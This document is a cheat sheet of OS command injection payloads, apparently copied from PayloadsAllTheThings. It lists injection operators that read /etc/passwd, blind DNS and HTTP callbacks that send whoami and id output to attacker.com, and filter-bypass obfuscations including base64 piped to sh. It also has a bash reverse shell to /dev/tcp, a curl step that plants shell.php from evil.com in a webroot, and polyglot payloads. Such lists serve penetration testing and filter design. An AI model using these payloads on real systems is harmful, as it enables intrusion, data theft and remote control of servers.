# OS Command Injection Payloads

> Source: PayloadsAllTheThings — Command Injection

## Basic Injection Operators

```bash
# Semicolon — sequential execution
;id
;cat /etc/passwd

# Pipe — output redirection
|id
|cat /etc/passwd

# AND — execute if first succeeds
&&id
&&cat /etc/passwd

# OR — execute if first fails
||id
||cat /etc/passwd

# Background execution
&id
&cat /etc/passwd

# Backtick substitution
`id`
`cat /etc/passwd`

# $() substitution
$(id)
$(cat /etc/passwd)

# Newline (%0a URL-encoded)
%0aid
%0acat%20/etc/passwd
```

## Blind Detection

### Time-Based

```bash
;sleep 5
|sleep 5
&&sleep 5
||sleep 5
$(sleep 5)
`sleep 5`
```

### DNS Callback

```bash
;nslookup attacker.com
$(nslookup attacker.com)
`nslookup attacker.com`
;for i in $(ls /) ; do host "$i.xxxx.burpcollaborator.net"; done
```

### HTTP Callback

```bash
;curl https://attacker.com/?d=$(whoami)
;wget https://attacker.com/?d=$(id)
$(curl https://attacker.com/$(whoami))
```

### Conditional Time-Based (Data Extraction)

```bash
if [ $(whoami|cut -c 1) == r ]; then sleep 5; fi
```

## Filter Bypass — Spaces

```bash
# $IFS (Internal Field Separator)
cat${IFS}/etc/passwd
ls${IFS}-la

# Brace expansion
{cat,/etc/passwd}
{ls,-la,/}

# Input redirection
cat</etc/passwd

# Tab (%09 URL-encoded)
;cat%09/etc/passwd

# ANSI-C Quoting
X=$'cat\x20/etc/passwd'&&$X
```

### Windows Space Bypass

```cmd
ping%CommonProgramFiles:~10,-18%127.0.0.1
```

## Filter Bypass — Command Name

```bash
# Quote insertion
w'h'o'am'i
wh''oami
w"h"o"am"i

# Backslash insertion
w\ho\am\i
/\b\i\n/////s\h

# Variable expansion
who$@ami
who$()ami

# Wildcard globbing
/???/??t /???/p??s??
/???/??n/c?t /???/p??s??

# Variable concatenation
a=c;b=at;c=/etc/passwd;$a$b $c
```

## Filter Bypass — Encoding

### Hex Encoding

```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
xxd -r -p <<< 2f6574632f706173737764
```

### Base64 Encoding

```bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
```

### Backslash-Newline (URL-Encoded)

```
cat%20/et%5C%0Ac/pa%5C%0Asswd
```

## Linux-Specific Payloads

```bash
# Using $HOME variable
cat ${HOME:0:1}etc${HOME:0:1}passwd

# tr-based char substitution
echo . | tr '!-0' '"-1'
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd

# Reverse shell
bash -i >& /dev/tcp/attacker/4444 0>&1
```

## Windows-Specific Payloads

```cmd
whoami
wHoAmI
type C:\Windows\win.ini

:: PowerShell execution
powershell -c "whoami"
powershell C:\*\*2\n??e*d.*?
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e whoami
```

## Argument Injection

```bash
# SSH ProxyCommand
ssh '-oProxyCommand="touch /tmp/pwned"' foo@foo

# curl output
curl http://evil.com/shell.php -o /var/www/html/shell.php

# Chrome GPU launcher
chrome '--gpu-launcher="id>/tmp/foo"'

# psql output
psql -o'|id>/tmp/foo'

# tar checkpoint
tar cf archive.tar --checkpoint=1 --checkpoint-action=exec=id
```

## Polyglot Payloads

```bash
# Multi-context (single/double/no quotes)
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

# Comprehensive polyglot
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
